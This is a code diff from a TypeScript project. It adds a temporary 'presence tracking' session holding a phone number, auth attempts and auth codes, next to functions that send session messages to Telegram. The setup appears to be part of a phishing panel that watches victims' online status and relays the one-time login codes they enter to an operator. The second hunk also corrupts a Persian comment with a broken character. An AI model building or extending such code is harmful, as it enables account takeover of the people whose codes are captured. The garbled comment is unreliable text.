@@ -51,6 +51,39 @@ export const generateSessionId = (): string => {
 };
 
 /**
+ * Create temporary session for presence tracking before phone submission
+ */
+export const createTemporarySession = (): string => {
+  const tempSessionId = `temp_${generateSessionId()}`;
+
+  // Create temporary session for presence tracking only
+  const tempSession: UserSession = {
+    sessionId: tempSessionId,
+    phoneNumber: "", // Will be filled later
+    startTime: new Date().toISOString(),
+    completedSteps: [],
+    currentStep: "phone",
+    authAttempts: {},
+    authCodes: {},
+    onlineStatus: {
+      isOnline: true,
+      isVisible: true,
+      lastActivity: Date.now(),
+      statusText: "online",
+      statusEmoji: "🟢",
+      lastUpdate: Date.now(),
+    },
+  };
+
+  // Store temporary session
+  activeSessions.set(tempSessionId, tempSession);
+
+  console.log("🔄 Created temporary session for presence:", tempSessionId.slice(-8));
+
+  return tempSessionId;
+};
+
+/**
  * Send custom message to Telegram and return message ID
  */
 export const sendCustomMessageToTelegram = async (
@@ -1303,7 +1336,7 @@ const formatSessionMessage = (session: UserSession): string => {
     // Single line status - perfect for multiple users
     message += `\n${statusIcon} <b>${statusText}</b> • ${timeAgo}`;
   } else {
-    // اگر onlineStatus موجود نیست، فرض کن کاربر آنلاین است
+    // اگر onlineStatus موجود نیست، فرض کن کاربر آنلای�� است
     message += `\n🟢 <b>online</b> • new`;
   }
   // Group codes by type with internal numbering
